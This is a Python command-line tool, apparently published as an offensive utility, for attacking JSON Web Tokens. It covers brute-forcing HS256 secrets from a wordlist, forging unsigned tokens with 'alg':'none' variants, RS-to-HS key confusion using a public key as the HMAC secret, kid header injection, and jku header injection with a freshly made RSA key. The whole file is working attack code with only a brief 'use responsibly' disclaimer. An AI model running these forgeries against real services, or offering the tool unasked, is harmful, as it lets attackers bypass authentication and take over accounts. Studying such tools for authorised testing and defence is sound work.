#!/usr/bin/env python3
#coding: utf-8
# jwt_pwned version 1.0.0 (06_10_2021)
# Written by Gustavo Segundo (@Bytenull%00)
# Please use responsibly...
# Software URL: https://github.com/X
# Contact: gasso2do@gmail.com

from colorama import init, Fore, Back, Style
import argparse
import jwt
import OpenSSL
import json
import sys
import time
import signal
import pyfiglet
from base64 import b64encode,urlsafe_b64encode, urlsafe_b64decode
from Crypto.Hash import HMAC, SHA256
from Crypto.PublicKey import RSA
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

def def_handler(sig, frame):
    print(Fore.RED+"\n[x] Exit ...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

ascii_banner = pyfiglet.figlet_format("Jwt_Pwned")
print(ascii_banner)
print("							v1.0.0")
print("							By Gustavo Segundo | gasso2do@gmail.com | @Bytenull%00 ")

parser = argparse.ArgumentParser()
subparser = parser.add_subparsers(dest='command')
bruteforce = subparser.add_parser('bruteforce',help='Brute force to JWT, only algorithm hash SHA256')
kid = subparser.add_parser('kid',help='Injection kid header attack')
jku = subparser.add_parser('jku',help='Injection jku header attack')
none = subparser.add_parser('none',help='Algorithm None attack')
konfusion = subparser.add_parser('konfusion',help='Key confusion attack')

bruteforce.add_argument('-t','--token',help='JWT to attack' ,type=str, required=True)
bruteforce.add_argument('-f','--filename', help='File containing possible secret keys', type=str, required=True)

kid.add_argument('-t','--token',help='JWT to attack',type=str, required=True)
kid.add_argument('-i','--injection',help='Value to inject into the kid parameter', type=str, required=True)
kid.add_argument('-s','--sign',help='Signature algorithm (HS256/HS384/HS512)', type=str, required=True)
kid.add_argument('-k','--key',help='Specific secret key', type=str, required=True)

jku.add_argument('-t','--token',help='JWT to attack', type=str, required=True)
jku.add_argument('-i','--injection',help='Value to inject into the jku parameter', type=str, required=True)


none.add_argument('-t','--token',help='JWT to attack', type=str, required=True)
konfusion.add_argument('-t','--token',help='JWT to attack', type=str, required=True)
konfusion.add_argument('-s','--sign',help='Signature algorithm (HS256/HS384/HS512)', type=str, required=True)
konfusion.add_argument('-pk','--pubkey',help='File containing the public key', type=str, required=True)

args = parser.parse_args()
init()

if args.command == 'bruteforce':
	print(Fore.YELLOW+"\n[i] Attack bruteforce JWT")  
	def firma(data,secret,sign):

		signature = HMAC.new(secret.encode(),data.encode(),SHA256).digest()
		signature = urlsafe_b64encode(signature).strip(b'=')
		if(signature.decode("utf-8") == sign):
			return True

	jwt_token=args.token
	headers, payload, sign = jwt_token.split('.')
	data=headers+"."+payload

	with open (args.filename) as f:
		lines = [line.rstrip() for line in f] 
	
	headers = urlsafe_b64decode(headers + '=' * (4 - len(headers) % 4)).decode()
	headers	= json.loads(headers)
	if(headers['alg']=='HS256'):
		print(Fore.BLUE+"\n[*] Looking for possible secret key, please wait ...")	
		for key in lines: 
			if(firma(data,key,sign)==True):
				print(Fore.GREEN+f"\n[+] Secret Key Found: {key}")
				sys.exit(0)
		print(Fore.RED+f"\n[-] Secret Key not Found ")		
	else:
		print(Fore.RED+"[x] Hashing algorithm not supported")
		sys.exit(1)

elif args.command == 'none':

	token = args.token
	headers, payload, sign = token.split('.')
	headers = urlsafe_b64decode(headers + '=' * (4 - len(headers) % 4)).decode()
	headers	= json.loads(headers)
	payload = urlsafe_b64decode(payload + '=' * (4 - len(payload) % 4)).decode()

	print(Fore.YELLOW+"\n[i] Attack None algorithm")
	print(Fore.BLUE+f"\n[*] Decoded Header value: {Fore.WHITE}{json.dumps(headers)}")
	print(Fore.BLUE+f"[*] Decoded Payload value: {Fore.WHITE}{payload}")
	modify_response = input(f"{Fore.MAGENTA}[>] Modify Payload? [y/N]: "+Fore.WHITE)
	if modify_response.lower() == 'y':
		payload = input(f"{Fore.MAGENTA}[>] Enter Your Payload value: "+Fore.WHITE)
	elif modify_response.lower() == 'n':
		pass
	else:
		print(Fore.RED+f"\n[-] Error: Input Invalid ... ")
		sys.exit(1)

	print(f'\nExploit: "alg":"none"')
	payload	= json.loads(payload)
	headers['alg'] = 'none'
	print(json.dumps(headers))
	header64 = urlsafe_b64encode(bytes(json.dumps(headers).replace(" ",""), encoding='utf-8')).decode('utf-8').rstrip('=')
	payload64 = urlsafe_b64encode(bytes(json.dumps(payload).replace(" ",""), encoding='utf-8')).decode('utf-8').rstrip('=')
	token = header64+'.'+payload64+'.'
	print(Fore.GREEN+f"[+] Successfully Encoded Token: {token}")

	print(Fore.WHITE+f'\nExploit: "alg":"None"')
	headers['alg'] = 'None'
	print(json.dumps(headers))
	header64 = urlsafe_b64encode(bytes(json.dumps(headers).replace(" ",""), encoding='utf-8')).decode('utf-8').rstrip('=')
	payload64 = urlsafe_b64encode(bytes(json.dumps(payload).replace(" ",""), encoding='utf-8')).decode('utf-8').rstrip('=')
	token = header64+'.'+payload64+'.'
	print(Fore.GREEN+f"[+] Successfully Encoded Token: {token}")

	print(Fore.WHITE+f'\nExploit: "alg":"nOnE"')
	headers['alg'] = 'nOnE'
	print(json.dumps(headers))
	header64 = urlsafe_b64encode(bytes(json.dumps(headers).replace(" ",""), encoding='utf-8')).decode('utf-8').rstrip('=')
	payload64 = urlsafe_b64encode(bytes(json.dumps(payload).replace(" ",""), encoding='utf-8')).decode('utf-8').rstrip('=')
	token = header64+'.'+payload64+'.'
	print(Fore.GREEN+f"[+] Successfully Encoded Token: {token}")

	print(Fore.WHITE+f'\nExploit: "alg":"NONE"')
	headers['alg'] = 'NONE'
	print(json.dumps(headers))
	header64 = urlsafe_b64encode(bytes(json.dumps(headers).replace(" ",""), encoding='utf-8')).decode('utf-8').rstrip('=')
	payload64 = urlsafe_b64encode(bytes(json.dumps(payload).replace(" ",""), encoding='utf-8')).decode('utf-8').rstrip('=')
	token = header64+'.'+payload64+'.'
	print(Fore.GREEN+f"[+] Successfully Encoded Token: {token}")

elif args.command == 'konfusion':

	token = args.token
	headers, payload, sign = token.split('.')
	headers = urlsafe_b64decode(headers + '=' * (4 - len(headers) % 4)).decode()
	headers	= json.loads(headers)
	payload = urlsafe_b64decode(payload + '=' * (4 - len(payload) % 4)).decode()

	print(Fore.YELLOW+"\n[i] Attack confusion algorithm")
	print(Fore.BLUE+f"\n[*] Decoded Header value: {Fore.WHITE}{json.dumps(headers)}")
	print(Fore.BLUE+f"[*] Decoded Payload value: {Fore.WHITE}{payload}")
	modify_response = input(f"{Fore.MAGENTA}[>] Modify Payload? [y/N]: "+Fore.WHITE)
	if modify_response.lower() == 'y':
		payload = input(f"{Fore.MAGENTA}[>] Enter Your Payload value: "+Fore.WHITE)
	elif modify_response.lower() == 'n':
		pass
	else:
		print(Fore.RED+f"\n[-] Error: Input Invalid ... ")
		sys.exit(1)

	if(args.sign.upper() == 'HS256'):
		headers['alg'] = 'HS256'
	elif(args.sign.upper() == 'HS384'):	
		headers['alg'] = 'HS384'
	elif(args.sign.upper() == 'HS512'):
		headers['alg'] = 'HS512'
	else:
		print(Fore.RED+"[-] Unsupported signature algorithm")
		sys.exit(1)

	payload	= json.loads(payload)
	header64 = urlsafe_b64encode(bytes(json.dumps(headers).replace(" ",""), encoding='utf-8')).decode('utf-8').rstrip('=')
	payload64 = urlsafe_b64encode(bytes(json.dumps(payload).replace(" ",""), encoding='utf-8')).decode('utf-8').rstrip('=')
	message = header64+'.'+payload64

	with open(args.pubkey, 'rb') as fd:
		public_key = fd.read()

	signature = HMAC.new(public_key, message.encode(), SHA256).digest()
	signature = urlsafe_b64encode(signature).strip(b'=')

	token = message+'.'+signature.decode()
	print(Fore.GREEN+f"[+] Successfully Encoded Token: {token}")

elif args.command == 'kid':

	token = args.token
	
	headers, payload, sign = token.split('.')
	headers = urlsafe_b64decode(headers + '=' * (4 - len(headers) % 4)).decode()
	
	headers	= json.loads(headers)

	headers['alg'] = args.sign.upper()
	headers['kid'] = args.injection

	print(Fore.YELLOW+"\n[i] Attack KID Header")
	print(Fore.BLUE+f"\n[*] New Decoded Header value: {Fore.WHITE}{json.dumps(headers)}")
	headers.pop('alg',None)

	payload = urlsafe_b64decode(payload + '=' * (4 - len(payload) % 4)).decode()
	print(Fore.BLUE+f"[*] Decoded Payload value: {Fore.WHITE}{payload}")
	modify_response = input(f"{Fore.MAGENTA}[>] Modify Payload? [y/N]: "+Fore.WHITE)
	if modify_response.lower() == 'y':
		payload = input(f"{Fore.MAGENTA}[>] Enter Your Payload value: "+Fore.WHITE)
	elif modify_response.lower() == 'n':
		pass
	else:
		print(Fore.RED+f"\n[-] Error: Input Invalid ... ")
		sys.exit(1)

	if(args.sign.upper() == 'HS256'):
		
		token_byte=jwt.encode(json.loads(payload),args.key,algorithm=args.sign.upper(),headers=headers)
		token=token_byte.decode()

		print(Fore.GREEN+f"[+] Successfully Encoded Token: {token}")
	elif(args.sign.upper() == 'HS384'):

		token_byte=jwt.encode(json.loads(payload),args.key,algorithm=args.sign.upper(),headers=headers)
		token=token_byte.decode()

		print(Fore.GREEN+f"[+] Successfully Encoded Token: {token}")

	elif(args.sign.upper() == 'HS512'):

		token_byte=jwt.encode(json.loads(payload),args.key,algorithm=args.sign.upper(),headers=headers)
		token=token_byte.decode()

		print(Fore.GREEN+f"[+] Successfully Encoded Token: {token}")

	else:
		print(Fore.RED+"[-] Unsupported signature algorithm")
		sys.exit(1)

elif args.command == 'jku':

	token = args.token
	headers, payload, sign = token.split('.')
	headers = urlsafe_b64decode(headers + '=' * (4 - len(headers) % 4)).decode()
	
	headers	= json.loads(headers)
	headers['jku'] = args.injection

	print(Fore.YELLOW+"\n[i] Attack jku Header")
	print(Fore.BLUE+f"[*] New Decoded Header value: {Fore.WHITE}{json.dumps(headers)}")
	

	payload = urlsafe_b64decode(payload + '=' * (4 - len(payload) % 4)).decode()
	print(Fore.BLUE+f"[*] Decoded Payload value: {Fore.WHITE}{payload}")
	modify_response = input(f"{Fore.MAGENTA}[>] Modify Payload? [y/N]: "+Fore.WHITE)
	if modify_response.lower() == 'y':
		payload = input(f"{Fore.MAGENTA}[>] Enter Your Payload value: "+Fore.WHITE)
	elif modify_response.lower() == 'n':
		pass
	else:
		print(Fore.RED+f"\n[-] Error: Input Invalid ... ")
		sys.exit(1)

	key = OpenSSL.crypto.PKey()
	key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)

	priv = key.to_cryptography_key()
	pub = priv.public_key()

	n = pub.public_numbers().n
	e = pub.public_numbers().e


	payload	= json.loads(payload)
	payload64 = urlsafe_b64encode(bytes(json.dumps(payload), encoding='utf-8')).decode('utf-8').rstrip('=')
	header64 = urlsafe_b64encode(bytes(json.dumps(headers), encoding='utf-8')).decode('utf-8').rstrip('=')


	str = header64+'.'+payload64
	sig = priv.sign(bytes(str,encoding='utf-8'), algorithm=hashes.SHA256(),padding=padding.PKCS1v15())

	print(Fore.GREEN+f"[+] Successfully Encoded Token:",str+'.'+urlsafe_b64encode(sig).decode('utf-8').rstrip('='))

	print(Fore.CYAN+'\n[!] Getting value of "n" and "e" from the public key')
	time.sleep(2)
	print(Fore.GREEN+f"[+] Value 'n':"+Fore.WHITE, urlsafe_b64encode((n).to_bytes((n).bit_length()//8+1,byteorder='big')).decode('utf-8').rstrip('='))
	print(Fore.GREEN+f"[+] Value 'e':"+Fore.WHITE, urlsafe_b64encode((e).to_bytes((e).bit_length()//8+1,byteorder='big')).decode('utf-8').rstrip('='))
